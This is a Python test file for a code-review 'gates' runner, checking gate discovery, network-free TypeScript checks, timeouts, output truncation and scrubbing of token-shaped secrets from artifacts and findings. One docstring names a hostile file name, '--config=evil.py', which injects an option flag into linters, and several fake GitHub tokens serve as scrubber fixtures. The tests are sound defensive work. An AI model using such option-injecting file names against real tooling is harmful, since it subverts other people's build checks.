        # Either ``master...HEAD`` or ``main...HEAD`` depending on the
        # local ``init.defaultBranch`` — both satisfy the contract.
        assert diff_gate.cmd[:3] == ["git", "diff", "--check"]
        if len(diff_gate.cmd) > 3:
            assert diff_gate.cmd[3].endswith("...HEAD")

    def test_git_diff_check_accepts_fully_qualified_local_ref(
        self, tmp_path: Path
    ) -> None:
        """Iter-17 Finding 2: ``_refresh_pr_base_ref`` lands the PR base
        into ``refs/remotes/pdd-checkup/pr-<N>/base`` so it cannot
        collide with the operator's own ``origin`` tracking refs. The
        gate resolver MUST accept that fully-qualified ref directly
        (instead of trying ``origin/refs/...`` and falling through to
        the generic candidate set, which would silently drop the PR
        range)."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "init", "-q"],
            cwd=tmp_path,
            check=True,
        )
        # Manufacture the dedicated tracking ref that
        # ``_refresh_pr_base_ref`` would produce in production.
        local_ref = "refs/remotes/pdd-checkup/pr-1/base"
        subprocess.run(
            ["git", "update-ref", local_ref, "HEAD"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
             "--allow-empty", "-m", "feat", "-q"],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref=local_ref)
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # The gate must run against the dedicated ref directly, not
        # ``origin/refs/...`` or a fallback like ``main...HEAD``.
        assert diff_gate.cmd == ["git", "diff", "--check", f"{local_ref}...HEAD"]

    def test_tsc_noemit_skipped_when_node_modules_typescript_absent(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3: tsc-noemit must NOT fire ``npx tsc`` when
        TypeScript isn't actually installed locally. Bare ``npx tsc``
        falls back to a registry download + install + exec when the
        local binary is missing, which violates the deterministic-local
        contract from issue #1092. Discovery must skip the gate in that
        case so the gate runner never gets a chance to network-install.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        # NOTE: no ``node_modules/typescript/bin/tsc`` on disk.
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "tsc-noemit" not in names

    def test_tsc_noemit_emitted_with_no_install_flag_when_locally_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3 inverse: once TypeScript IS installed
        locally, the gate fires — and it must pass ``--no-install`` so
        a future npx rewire still cannot reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        if "tsc-noemit" in names:  # only when ``npx`` is on PATH
            gate = next(g for g in gates if g.name == "tsc-noemit")
            assert "--no-install" in gate.cmd


class TestRunGates:
    """``run_gates`` executes each discovered gate and persists artifacts."""

    def test_records_exit_code_and_persists_artifact(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-ok",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0
        manifest = artifacts_dir / "round-1-review-gates.json"
        assert manifest.exists()
        payload = json.loads(manifest.read_text(encoding="utf-8"))
        assert payload[0]["exit_code"] == 0
        assert payload[0]["gate"]["name"] == "echo-ok"
        per_gate = artifacts_dir / "round-1-review-gate-echo-ok.txt"
        assert per_gate.exists()

    def test_failure_exit_code_recorded(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="echo-fail",
                cmd=[sys.executable, "-c", "import sys; sys.exit(7)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code == 7

    def test_truncates_oversize_output(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Emit ~200KB of stdout; the runner truncates to ~10KB.
        script = (
            "import sys; sys.stdout.write('A' * 200000); sys.exit(1)"
        )
        gates = [
            Gate(
                name="bigout",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # ~10KB cap, generously bound to allow a small marker like "[truncated]".
        assert len(results[0].stdout_excerpt) <= 12000
        assert results[0].stdout_excerpt  # not empty

    def test_handles_timeout(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Long sleep with a 0.1s timeout: runner must record exit_code=None
        # plus a non-empty error rather than block the loop.
        script = "import time; time.sleep(60)"
        gates = [
            Gate(
                name="hang",
                cmd=[sys.executable, "-c", script],
                source="<test>",
                timeout=0.1,
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        lowered = results[0].error.lower()
        assert "timeout" in lowered or "timed out" in lowered

    def test_handles_missing_binary(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        gates = [
            Gate(
                name="ghost",
                cmd=["this-binary-does-not-exist-xyz-1092"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].exit_code is None
        assert results[0].error  # non-empty

    def test_scrubs_secrets_in_excerpts(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Use ``Authorization: Bearer …`` which the existing scrubber regex
        # recognises, so the runner must consult the loop's scrubber before
        # persisting the excerpt.
        script = (
            "import sys; "
            "sys.stderr.write('error: Authorization: Bearer sk-abcdefghijklmnopqr\\n'); "
            "sys.exit(1)"
        )
        gates = [
            Gate(
                name="leakage",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "[REDACTED]" in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stderr_excerpt
        assert "sk-abcdefghijklmnopqr" not in results[0].stdout_excerpt

    def test_per_file_gate_name_and_source_scrub_when_path_contains_token(
        self, tmp_path: Path
    ) -> None:
        """Iter-25 Finding 1: a PR can change a Python file whose
        path contains a token-shaped substring (e.g.
        ``pkg/ghp_xxx_abcdefghijklmnopqrst.py``). The per-file gate
        names itself ``py-compile:<rel>`` and sets ``source=<rel>``,
        so without scrubbing the token leaks into:
        - the per-gate artifact FILENAME on disk (filename slug)
        - the per-gate artifact BODY (gate:/source: lines)
        - ReviewFinding.reviewer (``gate:<name>``)
        - ReviewFinding.location (``<source>``)
        - ReviewFinding.finding (the message text)
        All five surfaces must be redacted.
        """
        from pdd.checkup_gates import (
            discover_gates,
            gate_results_to_findings,
            run_gates,
        )

        _git_init(tmp_path)
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        # Token-shaped file name (ghp_ + 20+ alphanumeric chars).
        token_path_part = "ghp_AAAAAAAAAAAAAAAAAAAAAA"
        rel = f"pkg/{token_path_part}.py"
        # Bad syntax so the gate FAILS — that's what routes the
        # name/source through the finding adapter.
        (pkg / f"{token_path_part}.py").write_text(
            "this is not python(\n", encoding="utf-8"
        )
        gates = [g for g in discover_gates(tmp_path, changed_files=(rel,))
                 if g.name.startswith("py-compile:")]
        assert gates, "py-compile gate must be discovered"
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1,
            mode="review",
        )
        # On-disk per-gate artifact filename: token must not appear.
        files = list(artifacts_dir.glob("round-1-review-gate-*.txt"))
        assert files, "per-gate artifact must be written"
        for f in files:
            assert token_path_part not in f.name, f.name
            assert token_path_part not in f.read_text(encoding="utf-8")
        # Synthetic finding fields: reviewer/location/finding.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "failing gate must produce a finding"
        for f in findings:
            assert token_path_part not in (f.reviewer or "")
            assert token_path_part not in (f.location or "")
            assert token_path_part not in (f.finding or "")
            assert token_path_part not in (f.evidence or "")
            assert token_path_part not in (f.required_fix or "")

    def test_ruff_black_mypy_use_double_dash_separator(
        self, tmp_path: Path
    ) -> None:
        """Iter-25 Finding 2: a PR file named ``--config=evil.py`` (or
        any path starting with ``-``) would be parsed as a flag by
        ruff/black/mypy. Every per-file gate argv MUST include the
        POSIX ``--`` end-of-options separator before the file list so
        the tools treat each entry as a positional path.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        # Enable ruff / black / mypy via pyproject.
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        # Innocuous changed file — the assertion is on the argv shape,
        # not on the tool actually being installed; we only assert
        # when discovery emitted the gate.
        (tmp_path / "foo.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("foo.py",))
        for name in ("ruff", "black", "mypy"):
            matching = [g for g in gates if g.name == name]
            if not matching:  # tool may not be on PATH in the sandbox
                continue
            cmd = matching[0].cmd
            assert "--" in cmd, (
                f"{name} argv missing -- separator: {cmd}"
            )
            # The `--` must precede the file path.
            dash_idx = cmd.index("--")
            path_idx = cmd.index("foo.py")
            assert dash_idx < path_idx, (
                f"{name} `--` must come before the file path: {cmd}"
            )

    def test_manifest_and_to_dict_scrub_nested_gate_metadata(
        self, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 1: ``Gate.to_dict()`` MUST scrub every
        string it serializes — name, every cmd arg, source, and
        required_fix_hint. The dict flows into both the per-round
        JSON manifest and the in-memory state.gate_runs row that
        the review loop persists to final-state.json["gates"], so
        an operator-supplied token in argv that the pre-fix code
        leaked into both surfaces must now be redacted at the
        serialization boundary.
        """
        from pdd.checkup_gates import Gate, GateResult, run_gates

        secret = "ghp_" + ("C" * 40)
        # Use ``echo`` so the gate succeeds and the manifest is
        # actually written. The token rides in argv (and would
        # otherwise be persisted verbatim).
        gates = [
            Gate(
                name="leaky-argv",
                cmd=["echo", f"--token={secret}"],
                source=f"package.json:scripts.token={secret}",
                required_fix_hint=f"Stop committing token={secret}",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        # The scrubbed dict (used for the JSON manifest and the
        # review-loop state row) must be clean across ALL nested
        # fields.
        d = results[0].to_dict()
        # ``cmd`` is now a list of scrubbed strings.
        joined_cmd = " ".join(d["gate"]["cmd"])
        assert secret not in joined_cmd, joined_cmd
        assert secret not in d["gate"]["source"]
        assert secret not in d["gate"]["required_fix_hint"]
        # The on-disk JSON manifest must also be clean.
        manifest = (
            artifacts_dir / "round-1-review-gates.json"
        ).read_text(encoding="utf-8")
        assert secret not in manifest

    def test_persistence_failure_scrubs_error_field(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 2: when per-gate artifact persistence
        raises with a token in the exception text, the resulting
        ``GateResult.error`` MUST be scrubbed before it lands in
        the manifest / state.gate_runs row, and the WARNING log
        line MUST also be scrubbed.
        """
        from pdd.checkup_gates import Gate, run_gates

        secret = "ghp_" + ("D" * 40)
        gates = [
            Gate(
                name="ok-then-disk-fail",
                cmd=["echo", "hi"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = type(artifacts_dir).write_text

        def fail_write(self, *args, **kwargs):
            # Per-gate write fails with an exception text that
            # carries a secret.
            if "round-1-review-gate-" in self.name:
                raise OSError(f"disk full while writing {secret}")
            return original_write_text(self, *args, **kwargs)

        monkeypatch.setattr(Path, "write_text", fail_write)

        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        assert results[0].error
        # The error field landed in the manifest and in
        # ReviewFinding.evidence; must be scrubbed.
        assert secret not in (results[0].error or "")
        # The manifest itself reads the (now scrubbed) error.
        manifest_text = (
            artifacts_dir / "round-1-review-gates.json"
        ).read_text(encoding="utf-8")
        assert secret not in manifest_text

    def test_runner_error_scrubs_secrets_in_synthetic_finding_evidence(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 2: when a gate cmd contains an
        operator-supplied token (e.g. a fork PR poisons
        ``package.json`` with a token literal in a script body) and
        the runner crashes (``FileNotFoundError``,
        ``TimeoutExpired``, generic ``Exception``), the resulting
        ``GateResult.error`` includes the full argv tuple. That
        string flows into ``ReviewFinding.evidence`` which is
        rendered into the public PR comment AND persisted to
        final-state.json. Scrub at the source so no downstream
        consumer ever sees the raw token.
        """
        from pdd.checkup_gates import (
            Gate,
            gate_results_to_findings,
            run_gates,
        )

        secret = "ghp_" + ("B" * 40)
        gates = [
            Gate(
                # Missing binary so the runner hits FileNotFoundError;
                # the secret rides along in argv.
                name="leaky-runner",
                cmd=[
                    "/nonexistent-binary-pls-fail",
                    f"--token={secret}",
                ],
                source="package.json:scripts.format:check",
            )
        ]
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=tmp_path / "artifacts",
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code is None  # runner-error path
        # GateResult.error itself MUST be scrubbed.
        assert secret not in (results[0].error or "")
        # Synthetic ReviewFinding.evidence MUST NOT leak the token.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "runner error must produce a finding"
        for f in findings:
            assert secret not in (f.evidence or "")
            assert secret not in (f.required_fix or "")
        # Per-gate artifact MUST also be clean.
        artifact = (
            tmp_path / "artifacts" / "round-1-review-gate-leaky-runner.txt"
        ).read_text(encoding="utf-8")
        assert secret not in artifact

    def test_secret_at_truncation_boundary_is_scrubbed(self, tmp_path: Path) -> None:
        """Iter-22 Finding 1: a secret that lands near the 10KB
        truncation boundary must still be redacted. Pre-fix the runner
        called ``_scrub(_truncate(text))`` — truncation could leave a
        partial-token prefix that the scrub regex (anchored on the full
        token shape) no longer matched. The correct order is
        ``_truncate(_scrub(text))``: scrub the full output first.
        """
        from pdd.checkup_gates import Gate, _EXCERPT_LIMIT, run_gates

        # Pad stdout past _EXCERPT_LIMIT, then emit a full token at
        # the boundary so the previous truncate-first order would
        # chop the token mid-pattern and dodge the scrubber.
        padding = "x" * (_EXCERPT_LIMIT - 4)
        # ``ghp_`` + 36 chars satisfies the GitHub PAT regex
        # (``ghp_[A-Za-z0-9]{20,}``). Construct the literal at runtime
        # via ``chr()`` so it does not appear in argv (the per-gate
        # artifact also dumps the cmd line; we want this test focused
        # on the output-excerpt scrub-before-truncate contract, not on
        # operator-supplied argv leakage).
        secret_expr = (
            "chr(103)+chr(104)+chr(112)+chr(95)+'A'*40"  # 'ghp_' + 40*A
        )
        script = (
            f"import sys; sys.stdout.write({padding!r} + ({secret_expr})); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="boundary-leak",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        excerpt = results[0].stdout_excerpt
        # No part of the token survives — including a truncated
        # prefix like ``ghp_AAA`` that the pre-fix order would have
        # left in place.
        expected_secret = "ghp_" + ("A" * 40)
        assert expected_secret not in excerpt
        assert "ghp_" not in excerpt
        # The on-disk artifact MUST also be clean (it's written from
        # the same scrubbed/truncated string).
        artifact_text = (artifacts_dir / "round-1-review-gate-boundary-leak.txt").read_text(
            encoding="utf-8"
        )
        assert "ghp_" not in artifact_text

    def test_runs_with_ci_env_and_no_color(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # The runner must inject CI=1, NO_COLOR=1, FORCE_COLOR=0 so deterministic
        # gates emit non-interactive output. Probe via a dump-env gate.
        script = (
            "import os, sys; "
            "sys.stdout.write("
            "f\"CI={os.environ.get('CI')}|"
            "NO_COLOR={os.environ.get('NO_COLOR')}|"
            "FORCE_COLOR={os.environ.get('FORCE_COLOR')}\""
            "); sys.exit(0)"
        )
        gates = [
            Gate(
                name="env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "CI=1" in results[0].stdout_excerpt
        assert "NO_COLOR=1" in results[0].stdout_excerpt
        assert "FORCE_COLOR=0" in results[0].stdout_excerpt

    def test_strips_pdd_env_so_gate_does_not_inherit_loop_state(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Set a PDD_* env that must NOT leak into the gate process.
        monkeypatch.setenv("PDD_FAKE_SECRET", "must-not-appear")
        script = (
            "import os, sys; "
            "sys.stdout.write(os.environ.get('PDD_FAKE_SECRET', '<unset>')); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="pdd-env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].stdout_excerpt.strip() == "<unset>"

    def test_uses_worktree_as_cwd(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        script = "import os, sys; sys.stdout.write(os.getcwd()); sys.exit(0)"
        gates = [
            Gate(
                name="cwd-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # tmp_path may be a symlink on macOS; resolve both sides for comparison.
        emitted = Path(results[0].stdout_excerpt.strip()).resolve()
        assert emitted == tmp_path.resolve()

    def test_run_gates_handles_artifact_write_failure_as_gate_result(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Codex review iteration 1, Finding 3: an artifact persistence error
        must not crash ``run_gates`` or lose the result row — it must be
        recorded as a runner-side failure on that specific gate with a
        useful ``error`` field so the audit trail remains visible.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
            gates_mod.Gate(
                name="ok-gate-2",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            # Fail only on the per-gate text artifact for the first gate.
            if "round-1-review-gate-ok-gate.txt" in self.name:
                raise PermissionError("disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)

        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 2
        # The first gate gets a runner-error marker on the persistence
        # failure, even though the subprocess itself exited 0.
        first = results[0]
        assert first.exit_code is None
        assert first.error and (
            "permissionerror" in first.error.lower() or "disk full" in first.error.lower()
        )
        # The second gate still records its successful run.
        second = results[1]
        assert second.exit_code == 0

    def test_run_gates_survives_manifest_write_failure(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """The manifest is best-effort: when it fails, the call returns
        every collected ``GateResult`` and does not raise.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            if self.name.endswith("review-gates.json"):
                raise PermissionError("manifest disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)
        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0


class TestGateResultsToFindings:
    """``gate_results_to_findings`` converts failing gates to ``ReviewFinding``."""

    def test_failed_gate_becomes_blocker_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
            required_fix_hint="Run prettier --write . locally and commit.",
        )
        result = GateResult(
            gate=gate,
            exit_code=1,
            stdout_excerpt="Code style issues found in 2 files.",
            stderr_excerpt="",
            duration_seconds=0.5,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([result], round_number=2)
        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "blocker"
        assert finding.reviewer == "gate:prettier-check"
        assert finding.area == "deterministic-gate"
        assert (
            "prettier --check" in finding.required_fix.lower()
            or "prettier --write" in finding.required_fix.lower()
        )
        evidence_lower = finding.evidence.lower()
        assert "exit code 1" in evidence_lower or "exit_code=1" in evidence_lower
        assert finding.location == "package.json:scripts.format:check"
        assert finding.round_number == 2
        assert finding.status == "open"

    def test_passed_gates_skipped(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="ok", cmd=["true"], source="<test>")
        passing = GateResult(
            gate=gate,
            exit_code=0,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.01,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([passing], round_number=1)
        assert findings == []

    def test_runner_side_error_becomes_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="hang", cmd=["sleep", "10"], source="<test>")
        result = GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.1,
            started_at_iso="2025-01-01T00:00:00Z",
            error="timed out after 0.1s",
        )
        findings = gate_results_to_findings([result], round_number=1)
        assert len(findings) == 1
        assert findings[0].severity == "blocker"
        evidence_lower = findings[0].evidence.lower()
        assert "timed out" in evidence_lower or "timeout" in evidence_lower

    def test_dedup_key_is_stable_across_rounds(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="A",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:00Z",
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="B",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:01Z",
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key

    def test_gate_runner_error_finding_key_stable_across_rounds_with_volatile_error(
        self,
    ) -> None:
        """Codex review iteration 2, Finding 1: the runner-error finding's
        ``finding`` text MUST NOT embed ``result.error`` because that field
        carries volatile detail (paths, exception ``[Errno N]`` codes, etc.)
        that varies across rounds. ``ReviewFinding.key`` is built from
        ``severity|location|finding|required_fix``; an embedded volatile
        ``error`` breaks the dedup contract documented in
        ``pdd/prompts/checkup_gates_python.prompt`` and tested by
        ``test_dedup_key_is_stable_across_rounds`` for the
        exit_code != 0 branch.
        """
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="persist-fail",
            cmd=["true"],
            source="<test>",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:00Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-1-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:05Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-2-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key, (
            "runner-error finding keys MUST match across rounds despite "
            "round-specific paths in ``result.error``; otherwise the loop "
            "produces a duplicate finding row every round.\n"
            f"r1.key={r1[0].key!r}\nr2.key={r2[0].key!r}"
        )
        # The volatile error text MUST still appear in evidence so the
        # operator can still see the actual failure detail.
        assert "PermissionError" in r1[0].evidence
        assert "/tmp/round-1-review-gate-persist-fail.txt" in r1[0].evidence
